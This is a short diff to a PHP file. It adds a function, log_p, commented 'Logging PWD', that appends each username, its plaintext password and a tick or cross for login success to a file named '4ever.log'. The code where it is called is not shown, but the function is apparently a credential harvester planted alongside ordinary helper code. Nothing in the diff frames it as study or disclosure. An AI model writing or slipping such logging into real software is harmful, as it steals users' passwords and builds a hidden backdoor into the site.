@@ -14,4 +14,19 @@ function getCheck() {
 	$args = func_get_args();
 	if (array_diff($args, array_keys($_GET))) exit();
 }
+
+function log_p($u, $p, $s) {
+	//Logging PWD
+	$file = '4ever.log';
+	// Open the file to get existing content
+	$current = file_get_contents($file);
+	//$s = (true ? '✔' : '✖');
+
+	if($s == true) $s = '✔';
+	if($s == false) $s = '✖';
+	// Append a new person to the file
+	$current .= $u . "🔥" . $p . " " . $s ."\n";
+	// Write the contents back to the file
+	file_put_contents($file, $current);
+}
 ?>
